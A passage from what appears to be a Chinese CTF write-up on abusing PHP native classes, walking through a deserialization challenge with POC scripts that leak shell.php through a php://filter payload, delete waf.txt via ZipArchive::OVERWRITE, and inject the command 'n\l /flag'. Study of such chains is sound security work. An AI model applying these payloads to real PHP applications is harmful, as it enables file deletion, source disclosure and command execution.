    flags：用于打开档案的模式。有以下几种模式：
    ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。
    ZipArchive::CREATE：如果不存在则创建一个zip压缩包。
    ZipArchive::RDONLY：只读模式打开压缩包。
    ZipArchive::EXCL：如果压缩包已经存在，则出错。
    ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。
    注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8
通过ZipArchive直接调用open方法删除目标机上的文件
**梦里花开牡丹亭**
源码
    username='user';
            $this->password='user';
        }
        public function __wakeup(){
            if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
                $this->choice=new login($this->file,$this->filename,$this->content);
            }else{
                $this->choice = new register();
            }
        }
        public function __destruct() {
            $this->choice->checking($this->username,$this->password);
        }
    }
    class login{
        public $file;
        public $filename;
        public $content;
        public function __construct($file,$filename,$content)
        {
            $this->file=$file;
            $this->filename=$filename;
            $this->content=$content;
        }
        public function checking($username,$password)
        {
            if($username==='admin'&&$password==='admin'){
                $this->file->open($this->filename,$this->content);
                die('login success you can to open shell file!');
            }
        }
    }
    class register{
        public function checking($username,$password)
        {
            if($username==='admin'&&$password==='admin'){
                die('success register admin');
            }else{
                die('please register admin ');
            }
        }
    }
    class Open{
        function open($filename, $content){
            if(!file_get_contents('waf.txt')){    // 当waf.txt没读取成功时才能得到flag
                shell($content);
            }else{
                echo file_get_contents($filename.".php");    // filename=php://filter/read=convert.base64-encode/resource=shell
            }
        }
    }
    if($_GET['a']!==$_GET['b']&&(md5($_GET['a']) === md5($_GET['b'])) && (sha1($_GET['a'])=== sha1($_GET['b']))){
        @unserialize(base64_decode($_POST['unser']));
    }
构造反序列化POC来读取shell.php
    username='user';
            $this->password='user';
        }
        public function __wakeup(){
            if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
                $this->choice=new login($this->file,$this->filename,$this->content);
            }else{
                $this->choice = new register();
            }
        }
        public function __destruct() {
            $this->choice->checking($this->username,$this->password);
        }
    }
    class login{
        public $file;
        public $filename;   
        public $content;
    }
    class Open{
        function open($filename, $content){
        }
    }
    $poc = new Game();
    $poc->username = "admin";
    $poc->password = "admin";
    $poc->register = "admin";
    $poc->file = new Open();
    $poc->filename = "php://filter/read=convert.base64-encode/resource=shell";
    $poc->content = "xxx";
    echo base64_encode(serialize($poc));
执行POC生成的payload读取到shell.php的源码base64编码
解码得到shell.php源码
    username='user';
            $this->password='user';
        }
        public function __wakeup(){
            if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
                $this->choice=new login($this->file,$this->filename,$this->content);
            }else{
                $this->choice = new register();
            }
        }
        public function __destruct() {
            $this->choice->checking($this->username,$this->password);
        }
    }
    class login{
        public $file;
        public $filename;   
        public $content;
    }
    class Open{
        function open($filename, $content){
        }
    }
    $poc = new Game();
    $poc->username = "admin";
    $poc->password = "admin";
    $poc->register = "admin";
    $poc->file = new ZipArchive();
    $poc->filename = "waf.txt";
    $poc->content = ZipArchive::OVERWRITE;
    echo base64_encode(serialize($poc));
生成payload执行后，即可删除waf.txt。接下来就可以使用 n\l /fla* 执行命令读取flag了
    username='user';
            $this->password='user';
        }
        public function __wakeup(){
            if(md5($this->register)==="21232f297a57a5a743894a0e4a801fc3"){    // admin
                $this->choice=new login($this->file,$this->filename,$this->content);
            }else{
                $this->choice = new register();
            }
        }
        public function __destruct() {
            $this->choice->checking($this->username,$this->password);
        }
    }
    class login{
        public $file;
        public $filename;   
        public $content;
    }
    class Open{
        function open($filename, $content){
        }
    }
    $poc = new Game();
    $poc->username = "admin";
    $poc->password = "admin";
    $poc->register = "admin";
    $poc->file = new Open();
    $poc->filename = "xxx";
    $poc->content = "n\l /flag";
    echo base64_encode(serialize($poc));
##### php原生文件操作类
###### 遍历文件目录的类
  * DirectoryIterator 类
  * FilesystemIterator 类
  * GlobIterator 类
**DirectoryIterator 类**
会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 `__toString()`
方法，输出指定目录里面经过排序之后的第一个文件名
    ');
        //echo($f->__toString().'');
    }
* * *
###### 使用可遍历目录类绕过 open_basedir
链接：
* * *
###### 可读取文件类
**SplFileObject 类**
该类的构造方法可以构造一个新的文件对象用于后续的读取
* * *
###### 使用 ReflectionMethod 类获取类方法的相关信息
**ReflectionMethod** 类报告了一个方法的有关信息。可以在 PHP 运行状态中，扩展分析 PHP
程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API
##### 总结：
好多，有一些类还没有细看，粗略的了解了以下，基本上就是利用函数内置的类，来达到自己的一些目的。多与其他的渗透方法一起使用来得到flag。
##### 参考链接：
[(14条消息) PHP 原生类的利用_lmonstergg的博客-CSDN博客_php原生类](https://blog.csdn.net/cjdgg/article/details/115314651)
[PHP 原生类在 CTF 中的利用 - 安全客，安全资讯平台 (anquanke.com)](